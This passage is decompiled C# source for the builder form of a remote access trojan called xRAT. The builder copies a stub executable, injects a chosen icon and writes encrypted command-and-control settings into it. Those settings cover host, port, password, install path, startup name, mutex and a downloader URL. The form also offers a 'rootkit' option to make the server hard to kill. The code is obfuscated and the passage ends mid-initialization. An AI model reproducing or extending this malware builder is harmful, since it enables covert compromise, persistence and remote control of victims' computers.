namespace xRAT
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Net;
    using System.Net.Sockets;
    using System.Runtime.CompilerServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class Builder : Form
    {
        [AccessedThroughProperty("Button1")]
        private Button _Button1;
        [AccessedThroughProperty("Button2")]
        private Button _Button2;
        [AccessedThroughProperty("Button3")]
        private Button _Button3;
        [AccessedThroughProperty("Button4")]
        private Button _Button4;
        [AccessedThroughProperty("CheckBox1")]
        private CheckBox _CheckBox1;
        [AccessedThroughProperty("CheckBox2")]
        private CheckBox _CheckBox2;
        [AccessedThroughProperty("CheckBox3")]
        private CheckBox _CheckBox3;
        [AccessedThroughProperty("CheckBox4")]
        private CheckBox _CheckBox4;
        [AccessedThroughProperty("CheckBox5")]
        private CheckBox _CheckBox5;
        [AccessedThroughProperty("CheckBox6")]
        private CheckBox _CheckBox6;
        [AccessedThroughProperty("CheckBox7")]
        private CheckBox _CheckBox7;
        [AccessedThroughProperty("CheckBox8")]
        private CheckBox _CheckBox8;
        [AccessedThroughProperty("CheckBox9")]
        private CheckBox _CheckBox9;
        [AccessedThroughProperty("GroupBox1")]
        private GroupBox _GroupBox1;
        [AccessedThroughProperty("GroupBox2")]
        private GroupBox _GroupBox2;
        [AccessedThroughProperty("GroupBox3")]
        private GroupBox _GroupBox3;
        [AccessedThroughProperty("GroupBox4")]
        private GroupBox _GroupBox4;
        [AccessedThroughProperty("GroupBox5")]
        private GroupBox _GroupBox5;
        [AccessedThroughProperty("GroupBox6")]
        private GroupBox _GroupBox6;
        [AccessedThroughProperty("GroupBox7")]
        private GroupBox _GroupBox7;
        [AccessedThroughProperty("GroupBox8")]
        private GroupBox _GroupBox8;
        [AccessedThroughProperty("GroupBox9")]
        private GroupBox _GroupBox9;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label10")]
        private Label _Label10;
        [AccessedThroughProperty("Label11")]
        private Label _Label11;
        [AccessedThroughProperty("Label12")]
        private Label _Label12;
        [AccessedThroughProperty("Label13")]
        private Label _Label13;
        [AccessedThroughProperty("Label14")]
        private Label _Label14;
        [AccessedThroughProperty("Label15")]
        private Label _Label15;
        [AccessedThroughProperty("Label16")]
        private Label _Label16;
        [AccessedThroughProperty("Label17")]
        private Label _Label17;
        [AccessedThroughProperty("Label18")]
        private Label _Label18;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("Label20")]
        private Label _Label20;
        [AccessedThroughProperty("Label3")]
        private Label _Label3;
        [AccessedThroughProperty("Label4")]
        private Label _Label4;
        [AccessedThroughProperty("Label5")]
        private Label _Label5;
        [AccessedThroughProperty("Label6")]
        private Label _Label6;
        [AccessedThroughProperty("Label7")]
        private Label _Label7;
        [AccessedThroughProperty("Label8")]
        private Label _Label8;
        [AccessedThroughProperty("Label9")]
        private Label _Label9;
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        [AccessedThroughProperty("PictureBox3")]
        private PictureBox _PictureBox3;
        [AccessedThroughProperty("PictureBox4")]
        private PictureBox _PictureBox4;
        [AccessedThroughProperty("PictureBox5")]
        private PictureBox _PictureBox5;
        [AccessedThroughProperty("PictureBox6")]
        private PictureBox _PictureBox6;
        [AccessedThroughProperty("PictureBox7")]
        private PictureBox _PictureBox7;
        [AccessedThroughProperty("RadioButton1")]
        private RadioButton _RadioButton1;
        [AccessedThroughProperty("RadioButton2")]
        private RadioButton _RadioButton2;
        [AccessedThroughProperty("RadioButton3")]
        private RadioButton _RadioButton3;
        [AccessedThroughProperty("RadioButton4")]
        private RadioButton _RadioButton4;
        [AccessedThroughProperty("RadioButton5")]
        private RadioButton _RadioButton5;
        [AccessedThroughProperty("RadioButton6")]
        private RadioButton _RadioButton6;
        [AccessedThroughProperty("SideTab1")]
        private Control0 _SideTab1;
        [AccessedThroughProperty("TabPage1")]
        private TabPage _TabPage1;
        [AccessedThroughProperty("TabPage2")]
        private TabPage _TabPage2;
        [AccessedThroughProperty("TabPage3")]
        private TabPage _TabPage3;
        [AccessedThroughProperty("TabPage4")]
        private TabPage _TabPage4;
        [AccessedThroughProperty("TabPage5")]
        private TabPage _TabPage5;
        [AccessedThroughProperty("TabPage6")]
        private TabPage _TabPage6;
        [AccessedThroughProperty("TabPage7")]
        private TabPage _TabPage7;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("TextBox2")]
        private TextBox _TextBox2;
        [AccessedThroughProperty("TextBox3")]
        private TextBox _TextBox3;
        [AccessedThroughProperty("TextBox4")]
        private TextBox _TextBox4;
        [AccessedThroughProperty("TextBox5")]
        private TextBox _TextBox5;
        [AccessedThroughProperty("TextBox6")]
        private TextBox _TextBox6;
        [AccessedThroughProperty("TextBox7")]
        private TextBox _TextBox7;
        [AccessedThroughProperty("TextBox8")]
        private TextBox _TextBox8;
        [AccessedThroughProperty("TextBox9")]
        private TextBox _TextBox9;
        [AccessedThroughProperty("Win8Progressbar1")]
        private Win8Progressbar _Win8Progressbar1;
        [AccessedThroughProperty("CheckBox11")]
        private CheckBox checkBox_0;
        [AccessedThroughProperty("CheckBox12")]
        private CheckBox checkBox_1;
        [AccessedThroughProperty("CheckBox13")]
        private CheckBox checkBox_2;
        [AccessedThroughProperty("CheckBox14")]
        private CheckBox checkBox_3;
        [AccessedThroughProperty("CheckBox10")]
        private CheckBox checkBox_4;
        [AccessedThroughProperty("CheckBox15")]
        private CheckBox checkBox_5;
        [AccessedThroughProperty("GroupBox10")]
        private GroupBox groupBox_0;
        [AccessedThroughProperty("PictureBox2")]
        private PictureBox hpyZaNmIi;
        private IContainer icontainer_0;
        [AccessedThroughProperty("TextBox10")]
        private TextBox textBox_0;
        [AccessedThroughProperty("TextBox11")]
        private TextBox textBox_1;
        [AccessedThroughProperty("TextBox12")]
        private TextBox textBox_2;
        private Thread thread_0;
        [AccessedThroughProperty("ToolTip1")]
        private ToolTip toolTip_0;
        [AccessedThroughProperty("Label19")]
        private Label YrTaPhYjR;

        public Builder()
        {
            Class1.QaIGh5M7cuigS();
            base.FormClosing += new FormClosingEventHandler(this.Builder_FormClosing);
            base.Paint += new PaintEventHandler(this.Builder_Paint);
            base.Load += new EventHandler(this.Builder_Load);
            this.InitializeComponent();
        }

        [DebuggerStepThrough, CompilerGenerated]
        private void _Lambda$__1(object a0)
        {
            this.CheckConnection(Conversions.ToBoolean(a0));
        }

        private void Builder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (this.Label9.Visible)
            {
                e.Cancel = true;
                Interaction.MsgBox("Please wait...", MsgBoxStyle.Information, null);
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            this.TextBox5.PasswordChar = '●';
            this.TextBox6.Enabled = false;
            this.Button3.Enabled = false;
            this.CheckBox3.BackColor = Color.FromArgb(0x27, 0x27, 0x27);
            this.Win8Progressbar1.Value = 0;
            this.PictureBox5.Image = null;
            string str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            this.TextBox_0.Text = Conversions.ToString(this.method_1(0x11, str));
            if (this.RadioButton1.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton2.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton3.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
        }

        private void Builder_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.DrawLine(new Pen(Color.Black, 1f), 0, 350, 0x256, 350);
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            TextBox box;
            this.method_0();
            this.Win8Progressbar1.Value = 0;
            string path = FileSystem.CurDir() + @"\data\template.exe";
            if (!System.IO.File.Exists(path))
            {
                if (this.TextBox4.Text == null)
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "> Stub not found!";
                }
                else
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "\r\n> Stub not found!";
                }
                goto Label_0A7E;
            }
            if (this.TextBox1.Text == null)
            {
                if (this.TextBox4.Text == null)
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "> Please enter a Host or IP!";
                }
                else
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "\r\n> Please enter a Host or IP!";
                }
                this.SideTab1.SelectedTab = this.TabPage3;
                this.TextBox1.Focus();
                goto Label_0A7E;
            }
            if (this.TextBox2.Text == null)
            {
                if (this.TextBox4.Text == null)
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "> Please enter a Port!";
                }
                else
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "\r\n> Please enter a Port!";
                }
                this.SideTab1.SelectedTab = this.TabPage3;
                this.TextBox2.Focus();
                goto Label_0A7E;
            }
            if (this.TextBox8.Text == null)
            {
                if (this.TextBox4.Text == null)
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "> Please enter a Server-Name!";
                }
                else
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "\r\n> Please enter a Server-Name!";
                }
                this.SideTab1.SelectedTab = this.TabPage4;
                this.TextBox8.Focus();
                goto Label_0A7E;
            }
            if (this.TextBox5.Text == null)
            {
                if (this.TextBox4.Text == null)
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "> Please enter a Password!";
                }
                else
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "\r\n> Please enter a Password!";
                }
                this.SideTab1.SelectedTab = this.TabPage3;
                this.TextBox5.Focus();
                goto Label_0A7E;
            }
            if (this.TextBox3.Text == null)
            {
                if (this.TextBox4.Text == null)
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "> Please enter a Startup-Name!";
                }
                else
                {
                    box = this.TextBox4;
                    box.Text = box.Text + "\r\n> Please enter a Startup-Name!";
                }
                this.SideTab1.SelectedTab = this.TabPage4;
                this.TextBox3.Focus();
                goto Label_0A7E;
            }
            if (this.TextBox_0.Text != null)
            {
                using (SaveFileDialog dialog = new SaveFileDialog())
                {
                    dialog.Filter = "EXE Files *.exe|*.exe";
                    if (dialog.ShowDialog() == DialogResult.OK)
                    {
                        if (!System.IO.File.Exists(dialog.FileName))
                        {
                            this.TextBox4.Text = null;
                            box = this.TextBox4;
                            box.Text = box.Text + "> Starting now...";
                            try
                            {
                                int num;
                                int num2;
                                string text;
                                this.Win8Progressbar1.Value = 2;
                                Thread.Sleep(200);
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Preparing Stub...";
                                System.IO.File.Copy(path, dialog.FileName, true);
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Stub successful prepared!";
                                if (this.CheckBox2.Checked)
                                {
                                    if (System.IO.File.Exists(this.TextBox6.Text))
                                    {
                                        IconInjector.InjectIcon(dialog.FileName, this.TextBox6.Text);
                                        box = this.TextBox4;
                                        box.Text = box.Text + "\r\n> Changing Icon...";
                                        this.Win8Progressbar1.Value = 4;
                                        Thread.Sleep(200);
                                        box = this.TextBox4;
                                        box.Text = box.Text + "\r\n> Icon successful changed!";
                                    }
                                    else
                                    {
                                        box = this.TextBox4;
                                        box.Text = box.Text + "\r\n> Icon not found!";
                                        this.Win8Progressbar1.Value = 4;
                                        Thread.Sleep(200);
                                    }
                                }
                                if (!this.CheckBox_5.Checked)
                                {
                                    this.TextBox_2.Text = "";
                                }
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Getting Settings...";
                                if (this.TextBox9.Text.Trim() == null)
                                {
                                    text = "0";
                                }
                                else
                                {
                                    text = this.TextBox9.Text;
                                }
                                if (this.RadioButton1.Checked)
                                {
                                    num2 = 1;
                                }
                                else if (this.RadioButton2.Checked)
                                {
                                    num2 = 2;
                                }
                                else if (this.RadioButton3.Checked)
                                {
                                    num2 = 3;
                                }
                                else if (this.RadioButton4.Checked)
                                {
                                    num2 = 4;
                                }
                                else if (this.RadioButton5.Checked)
                                {
                                    num2 = 5;
                                }
                                else if (this.RadioButton6.Checked)
                                {
                                    num2 = 6;
                                }
                                if (!this.RadioButton6.Checked)
                                {
                                }
                                this.Win8Progressbar1.Value = 5;
                                Thread.Sleep(200);
                                if (this.CheckBox5.Checked)
                                {
                                    num = 1;
                                }
                                else if (this.CheckBox6.Checked)
                                {
                                    num = 2;
                                }
                                else
                                {
                                    num = 0;
                                }
                                this.Win8Progressbar1.Value = 6;
                                Thread.Sleep(200);
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Got Settings!";
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Encrypting Settings...";
                                string s = Class2.Class4_0.method_6().Encrypt("HADES666", @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", this.TextBox1.Text) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", this.TextBox2.Text) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homerPWD24", this.TextBox5.Text) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", this.TextBox7.Text) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", this.TextBox8.Text + ".exe") + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", this.TextBox3.Text) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", text) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", Conversions.ToString(num2)) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", Conversions.ToString(num)) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", this.TextBox_0.Text) + @"|//666\\|" + Class2.Class4_0.method_6().Encrypt("Secr2t-pizza-homer", this.TextBox_2.Text));
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Settings successful encrypted!";
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Writing Resources...";
                                Class7.smethod_1(dialog.FileName, Encoding.Default.GetBytes(s));
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Resources successful written!";
                                this.Win8Progressbar1.Value = 8;
                                Thread.Sleep(200);
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Done!";
                                box = this.TextBox4;
                                box.Text = box.Text + "\r\n> Server saved to: " + dialog.FileName;
                                string[] items = new string[3];
                                items[0] = Conversions.ToString(DateTime.Now);
                                items[1] = "Server created.";
                                ListViewItem item = new ListViewItem(items);
                                Class2.Class4_0.method_6().ListView1.Items.Add(item);
                                this.Win8Progressbar1.Value = 10;
                            }
                            catch (Exception exception1)
                            {
                                ProjectData.SetProjectError(exception1);
                                if (this.TextBox4.Text == null)
                                {
                                    box = this.TextBox4;
                                    box.Text = box.Text + "> Error while creating the server!";
                                }
                                else
                                {
                                    box = this.TextBox4;
                                    box.Text = box.Text + "\r\n> Error while creating the server:";
                                }
                                ProjectData.ClearProjectError();
                            }
                        }
                        else if (this.TextBox4.Text == null)
                        {
                            box = this.TextBox4;
                            box.Text = box.Text + "> A Server with this name already exists!";
                        }
                        else
                        {
                            box = this.TextBox4;
                            box.Text = box.Text + "\r\n> A Server with this name already exists!";
                        }
                    }
                    goto Label_07CF;
                }
            }
            if (this.TextBox4.Text == null)
            {
                box = this.TextBox4;
                box.Text = box.Text + "> Please enter a Mutex!";
            }
            else
            {
                box = this.TextBox4;
                box.Text = box.Text + "\r\n> Please enter a Mutex!";
            }
        Label_07CF:
            this.SideTab1.SelectedTab = this.TabPage4;
            this.TextBox_0.Focus();
        Label_0A7E:
            this.TextBox4.SelectionStart = this.TextBox4.Text.Length;
            this.TextBox4.ScrollToCaret();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            bool listening = Class2.Class4_0.method_6().listening;
            this.thread_0 = new Thread(new ParameterizedThreadStart(this._Lambda$__1));
            this.thread_0.IsBackground = true;
            this.thread_0.Start(listening);
            this.PictureBox5.Image = Class5.smethod_49();
            this.Button2.Enabled = false;
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "Icon (*.ico) |*.ico"
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                this.TextBox6.Text = dialog.FileName;
                try
                {
                    this.PictureBox1.Image = Image.FromFile(this.TextBox6.Text);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
            }
        }

        private void Button4_Click(object sender, EventArgs e)
        {
            string str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            this.TextBox_0.Text = Conversions.ToString(this.method_1(0x11, str));
        }

        private void CheckBox_5_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (this.CheckBox1.Checked)
            {
                this.TextBox5.PasswordChar = '\0';
            }
            else if (!this.CheckBox1.Checked)
            {
                this.TextBox5.PasswordChar = '●';
            }
        }

        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (this.CheckBox2.Checked)
            {
                this.TextBox6.Enabled = true;
                this.Button3.Enabled = true;
            }
            else if (!this.CheckBox2.Checked)
            {
                this.TextBox6.Enabled = false;
                this.Button3.Enabled = false;
            }
        }

        private void CheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            Point point;
            if (this.CheckBox3.Checked)
            {
                point = new Point(0x256, 0x20c);
                this.Size = (Size) point;
            }
            else if (!this.CheckBox3.Checked)
            {
                point = new Point(0x256, 0x1b1);
                this.Size = (Size) point;
            }
        }

        public void CheckConnection(bool isListening)
        {
            if (!isListening)
            {
                if ((this.TextBox1.Text == null) | (this.TextBox2.Text == null))
                {
                    this.Invoke(new DelegateToggleConnectionResult(this.ToggleConnectionResult), new object[] { 4 });
                    this.Invoke(new DelShowit(this.Showit));
                    this.Invoke(new DelegateStopCheck(this.StopCheck));
                }
                string text = this.TextBox1.Text;
                try
                {
                    if (text.Contains("http://www."))
                    {
                        text = Dns.GetHostEntry(text.Replace("http://www.", string.Empty)).AddressList[0].ToString();
                    }
                    else if (text.Contains("www."))
                    {
                        text = Dns.GetHostEntry(text.Replace("www.", string.Empty)).AddressList[0].ToString();
                    }
                    else if (text.Contains("http://"))
                    {
                        text = Dns.GetHostEntry(text.Replace("http://", string.Empty)).AddressList[0].ToString();
                    }
                    else
                    {
                        text = Dns.GetHostEntry(text).AddressList[0].ToString();
                    }
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    TcpListener listener = new TcpListener(IPAddress.Any, Conversions.ToInteger(this.TextBox2.Text));
                    listener.Start();
                    TcpClient client = new TcpClient(text, Conversions.ToInteger(this.TextBox2.Text));
                    if (client.Connected)
                    {
                        this.Invoke(new DelegateToggleConnectionResult(this.ToggleConnectionResult), new object[] { 0 });
                    }
                    client.Close();
                    listener.Stop();
                    goto Label_022E;
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    this.Invoke(new DelegateToggleConnectionResult(this.ToggleConnectionResult), new object[] { 1 });
                    ProjectData.ClearProjectError();
                    goto Label_022E;
                }
            }
            this.Invoke(new DelegateToggleConnectionResult(this.ToggleConnectionResult), new object[] { 3 });
            Interaction.MsgBox("Please stop listening before you test your connection!", MsgBoxStyle.Information, null);
        Label_022E:
            this.Invoke(new DelegateStopCheck(this.StopCheck));
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            this.icontainer_0 = new System.ComponentModel.Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(Builder));
            this.TabPage1 = new TabPage();
            this.TabPage2 = new TabPage();
            this.TextBox4 = new TextBox();
            this.CheckBox3 = new CheckBox();
            this.ToolTip1 = new ToolTip(this.icontainer_0);
            this.TextBox5 = new TextBox();
            this.Label8 = new Label();
            this.TabPage6 = new TabPage();
            this.GroupBox_0 = new GroupBox();
            this.TextBox_2 = new TextBox();
            this.CheckBox_5 = new CheckBox();
            this.GroupBox8 = new GroupBox();
            this.PictureBox7 = new PictureBox();
            this.CheckBox6 = new CheckBox();
            this.CheckBox4 = new CheckBox();
            this.Label10 = new Label();
            this.TextBox7 = new TextBox();
            this.CheckBox5 = new CheckBox();
            this.Label20 = new Label();
            this.TabPage5 = new TabPage();
            this.GroupBox7 = new GroupBox();
            this.PictureBox1 = new PictureBox();
            this.GroupBox6 = new GroupBox();
            this.TextBox6 = new TextBox();
            this.Button3 = new Button();
            this.CheckBox2 = new CheckBox();
            this.Label19 = new Label();
            this.TabPage4 = new TabPage();
            this.GroupBox9 = new GroupBox();
            this.Button4 = new Button();
            this.TextBox_0 = new TextBox();
            this.Label14 = new Label();
            this.GroupBox3 = new GroupBox();
            this.Label12 = new Label();
            this.Label6 = new Label();
            this.Label13 = new Label();
            this.TextBox3 = new TextBox();
            this.TextBox8 = new TextBox();
            this.GroupBox2 = new GroupBox();
            this.RadioButton6 = new RadioButton();
            this.PictureBox6 = new PictureBox();
            this.RadioButton5 = new RadioButton();
            this.RadioButton4 = new RadioButton();
            this.Label11 = new Label();
            this.Label7 = new Label();
            this.PictureBox3 = new PictureBox();
            this.Label5 = new Label();
            this.PictureBox2 = new PictureBox();
            this.TextBox9 = new TextBox();
            this.RadioButton3 = new RadioButton();
            this.RadioButton1 = new RadioButton();
            this.RadioButton2 = new RadioButton();
            this.GroupBox1 = new GroupBox();
            this.Label15 = new Label();
            this.TabPage3 = new TabPage();
            this.GroupBox5 = new GroupBox();
            this.Label9 = new Label();
            this.PictureBox5 = new PictureBox();
            this.Label18 = new Label();
            this.Button2 = new Button();
            this.GroupBox4 = new GroupBox();
            this.PictureBox4 = new PictureBox();
            this.Label1 = new Label();
            this.Label4 = new Label();
            this.CheckBox1 = new CheckBox();
            this.Label2 = new Label();
            this.Label3 = new Label();
            this.TextBox1 = new TextBox();
            this.TextBox2 = new TextBox();
            this.Label16 = new Label();
            this.SideTab1 = new Control0();
            this.TabPage7 = new TabPage();
            this.TextBox_1 = new TextBox();
            this.Label17 = new Label();
            this.CheckBox_0 = new CheckBox();
            this.CheckBox_1 = new CheckBox();
            this.CheckBox_2 = new CheckBox();
            this.CheckBox_3 = new CheckBox();
            this.CheckBox7 = new CheckBox();
            this.CheckBox8 = new CheckBox();
            this.CheckBox9 = new CheckBox();
            this.CheckBox_4 = new CheckBox();
            this.Win8Progressbar1 = new Win8Progressbar();
            this.Button1 = new Button();
            this.TabPage6.SuspendLayout();
            this.GroupBox_0.SuspendLayout();
            this.GroupBox8.SuspendLayout();
            ((ISupportInitialize) this.PictureBox7).BeginInit();
            this.TabPage5.SuspendLayout();
            this.GroupBox7.SuspendLayout();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.GroupBox6.SuspendLayout();
            this.TabPage4.SuspendLayout();
            this.GroupBox9.SuspendLayout();
            this.GroupBox3.SuspendLayout();
            this.GroupBox2.SuspendLayout();
            ((ISupportInitialize) this.PictureBox6).BeginInit();
            ((ISupportInitialize) this.PictureBox3).BeginInit();
            ((ISupportInitialize) this.PictureBox2).BeginInit();
            this.GroupBox1.SuspendLayout();
            this.TabPage3.SuspendLayout();
            this.GroupBox5.SuspendLayout();
            ((ISupportInitialize) this.PictureBox5).BeginInit();
            this.GroupBox4.SuspendLayout();
            ((ISupportInitialize) this.PictureBox4).BeginInit();
            this.SideTab1.SuspendLayout();
            this.TabPage7.SuspendLayout();
            this.SuspendLayout();
            this.TabPage1.BackColor = Color.White;
            Point point = new Point(140, 4);
            this.TabPage1.Location = point;
            this.TabPage1.Name = "TabPage1";
            Padding padding = new Padding(3);
            this.TabPage1.Padding = padding;
            Size size = new Size(0x1bc, 0x156);
            this.TabPage1.Size = size;
            this.TabPage1.TabIndex = 0;
            this.TabPage1.Text = "TabPage1";
            this.TabPage2.BackColor = Color.White;
            point = new Point(140, 4);
            this.TabPage2.Location = point;
            this.TabPage2.Name = "TabPage2";
            padding = new Padding(3);
            this.TabPage2.Padding = padding;
            size = new Size(0x1bc, 260);
            this.TabPage2.Size = size;
            this.TabPage2.TabIndex = 1;
            this.TabPage2.Text = "TabPage2";
            this.TextBox4.BackColor = Color.White;
            point = new Point(12, 0x195);
            this.TextBox4.Location = point;
            this.TextBox4.Multiline = true;
            this.TextBox4.Name = "TextBox4";
            this.TextBox4.ReadOnly = true;
            this.TextBox4.ScrollBars = ScrollBars.Vertical;
            size = new Size(0x234, 0x4b);
            this.TextBox4.Size = size;
            this.TextBox4.TabIndex = 2;
            this.CheckBox3.AutoSize = true;
            this.CheckBox3.BackColor = Color.FromArgb(0x40, 0x40, 0x40);
            this.CheckBox3.ForeColor = Color.Silver;
            point = new Point(11, 0x147);
            this.CheckBox3.Location = point;
            this.CheckBox3.Name = "CheckBox3";
            size = new Size(0x48, 0x11);
            this.CheckBox3.Size = size;
            this.CheckBox3.TabIndex = 4;
            this.CheckBox3.Text = "Show Log";
            this.CheckBox3.UseVisualStyleBackColor = false;
            point = new Point(0x44, 120);
            this.TextBox5.Location = point;
            this.TextBox5.Name = "TextBox5";
            size = new Size(0xcd, 0x15);
            this.TextBox5.Size = size;
            this.TextBox5.TabIndex = 30;
            this.Label8.AutoSize = true;
            point = new Point(6, 0x7b);
            this.Label8.Location = point;
            this.Label8.Name = "Label8";
            size = new Size(0x39, 13);
            this.Label8.Size = size;
            this.Label8.TabIndex = 0x23;
            this.Label8.Text = "Password:";
            this.TabPage6.BackColor = Color.White;
            this.TabPage6.Controls.Add(this.GroupBox_0);
            this.TabPage6.Controls.Add(this.GroupBox8);
            this.TabPage6.Controls.Add(this.Label20);
            point = new Point(140, 4);
            this.TabPage6.Location = point;
            this.TabPage6.Name = "TabPage6";
            size = new Size(0x1bc, 0x156);
            this.TabPage6.Size = size;
            this.TabPage6.TabIndex = 3;
            this.TabPage6.Text = "Miscellaneous";
            this.GroupBox_0.Controls.Add(this.TextBox_2);
            this.GroupBox_0.Controls.Add(this.CheckBox_5);
            point = new Point(6, 0xa7);
            this.GroupBox_0.Location = point;
            this.GroupBox_0.Name = "GroupBox10";
            size = new Size(430, 0x37);
            this.GroupBox_0.Size = size;
            this.GroupBox_0.TabIndex = 0x2c;
            this.GroupBox_0.TabStop = false;
            this.GroupBox_0.Text = "      Downloader";
            point = new Point(6, 20);
            this.TextBox_2.Location = point;
            this.TextBox_2.Name = "TextBox12";
            size = new Size(0x1a2, 0x15);
            this.TextBox_2.Size = size;
            this.TextBox_2.TabIndex = 1;
            this.TextBox_2.Text = "http://www.website.com/legit.exe";
            this.CheckBox_5.AutoSize = true;
            point = new Point(11, 0);
            this.CheckBox_5.Location = point;
            this.CheckBox_5.Name = "CheckBox15";
            size = new Size(15, 14);
            this.CheckBox_5.Size = size;
            this.CheckBox_5.TabIndex = 0;
            this.CheckBox_5.UseVisualStyleBackColor = true;
            this.GroupBox8.Controls.Add(this.PictureBox7);
            this.GroupBox8.Controls.Add(this.CheckBox6);
            this.GroupBox8.Controls.Add(this.CheckBox4);
            this.GroupBox8.Controls.Add(this.Label10);
            this.GroupBox8.Controls.Add(this.TextBox7);
            this.GroupBox8.Controls.Add(this.CheckBox5);
            point = new Point(6, 0x25);
            this.GroupBox8.Location = point;
            this.GroupBox8.Name = "GroupBox8";
            size = new Size(430, 0x7c);
            this.GroupBox8.Size = size;
            this.GroupBox8.TabIndex = 0x2b;
            this.GroupBox8.TabStop = false;
            this.GroupBox8.Text = "Miscellaneous Settings";
            this.PictureBox7.Image = Class5.smethod_88();
            point = new Point(9, 0x56);
            this.PictureBox7.Location = point;
            this.PictureBox7.Name = "PictureBox7";
            size = new Size(0x10, 20);
            this.PictureBox7.Size = size;
            this.PictureBox7.SizeMode = PictureBoxSizeMode.AutoSize;
            this.PictureBox7.TabIndex = 40;
            this.PictureBox7.TabStop = false;
            this.CheckBox6.AutoSize = true;
            point = new Point(0x1f, 0x58);
            this.CheckBox6.Location = point;
            this.CheckBox6.Name = "CheckBox6";
            size = new Size(0xc9, 0x11);
            this.CheckBox6.Size = size;
            this.CheckBox6.TabIndex = 0x18;
            this.CheckBox6.Text = "Rootkit (make the server hard to kill)";
            this.CheckBox6.UseVisualStyleBackColor = true;
            this.CheckBox4.AutoSize = true;
            point = new Point(0x1f, 0x42);
            this.CheckBox4.Location = point;
            this.CheckBox4.Name = "CheckBox4";
            size = new Size(0x35, 0x11);
            this.CheckBox4.Size = size;
